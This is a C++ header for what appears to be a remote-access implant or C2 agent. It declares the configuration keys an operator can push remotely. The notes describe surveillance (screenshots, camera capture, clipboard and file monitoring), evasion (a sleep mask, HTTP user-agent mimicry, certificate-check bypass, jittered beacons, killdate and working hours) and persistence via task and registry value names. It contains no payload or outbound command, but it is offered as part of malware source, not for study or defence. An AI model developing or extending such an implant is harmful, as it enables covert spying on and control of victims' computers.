#pragma once
/**
 * @file ConfigContract.hpp
 * @brief 远程配置键契约 —— 单一数据源
 * @details
 * 一张静态表声明**所有可远程下发的键**(全部为子域,  起**顶层不再有散键**
 * —— 原 10 个散键归位进 runtime/http/persist 三域, 不做旧散键兼容), 是三方的共同契约:
 *   - `AgentConfig::ApplyJson`(下发) 与 `DumpJson`(回读) 的键清单以此为准;
 *   - `DumpJson` 的 `_contract` 区把表原样暴露给前端/脚本(表单/校验可据此生成);
 *   - `ConfigContractCases.cpp` 用例**逐键断言三方一致**(下发可用 / 回读齐全 /
 *     回读无表外漂移) —— 以后加键: 改 ApplyJson + 改 DumpJson + **在表里加一行**,
 *     漏掉任何一处用例当场红。
 * 表里**不含**: `_startup`(生成期烧入只读区) 与 `_contract` 自身(元数据)。
 */

#include <vector>

namespace cleat {

    enum class ConfigKeyKind {
        Domain,   ///< 子域: JSON 对象, 域内字段校验由各自 ApplyXxx 负责
        Bool,
        Int,
        UInt,
        String,
    };

    struct ConfigKeySpec {
        const char* name;       ///< SetConfig / DumpJson 的键名
        ConfigKeyKind kind;
        const char* note;       ///< 一句话说明(供前端/文档生成)
    };

    /// 全部可远程键(顺序即展示顺序; 只增不改名 —— 改名是协议破坏)
    inline const std::vector<ConfigKeySpec>& ConfigContractKeys() {
        static const std::vector<ConfigKeySpec> k = {
            // ---- 子域 ----
            { "heartbeat",         ConfigKeyKind::Domain, u8"心跳节拍(base/jitter/丢拍)" },
            { "reconnect",         ConfigKeyKind::Domain, u8"重连退避(base/max/抖动)" },
            { "transport_failover", ConfigKeyKind::Domain, u8"降级链策略(回探/驻留)" },
            { "recovery",          ConfigKeyKind::Domain, u8"死投递恢复(平台清单/阈值/重试节奏; key 不回读)" },
            { "channels",          ConfigKeyKind::Domain, u8"通道降级链(整体替换, 热切换)" },
            { "channel_limit",     ConfigKeyKind::Domain, u8"低带宽通道报文限流(黑名单/明细)" },
            { "service_defaults",  ConfigKeyKind::Domain, u8"服务默认参数(采样率/间隔/分块)" },
            { "capture",           ConfigKeyKind::Domain, u8"采集参数(截屏/摄像头质量)" },
            { "clipboard",         ConfigKeyKind::Domain, u8"剪贴板监控(间隔/规则)" },
            { "file_monitor",      ConfigKeyKind::Domain, u8"文件监控(目录/递归/规则)" },
            { "lifecycle",         ConfigKeyKind::Domain, u8"生命周期(killdate/工作时间)" },
            { "runtime",           ConfigKeyKind::Domain, u8"运行参数(first_connect_delay_max_ms/worker_timeout_ms/log_level; crash_dump_enabled 已移除: 崩溃日志改由构建期决定, Debug 恒开/Release 恒关)" },
            { "http",              ConfigKeyKind::Domain, u8"HTTP 伪装与出站(user_agent/ignore_cert/proxy/mimic)" },
            { "quic",              ConfigKeyKind::Domain, u8"QUIC 通道选项(ignore_cert)" },
            { "mask",              ConfigKeyKind::Domain, u8"睡眠掩码(enabled/sleep_ms/jitter_permille; 执行体需 CLEAT_WITH_MASK 构建, 未编入时配置无害)" },
            { "persist",           ConfigKeyKind::Domain, u8"持久化标识(value_name/task_name/author)" },
        };
        return k;
    }

} // namespace cleat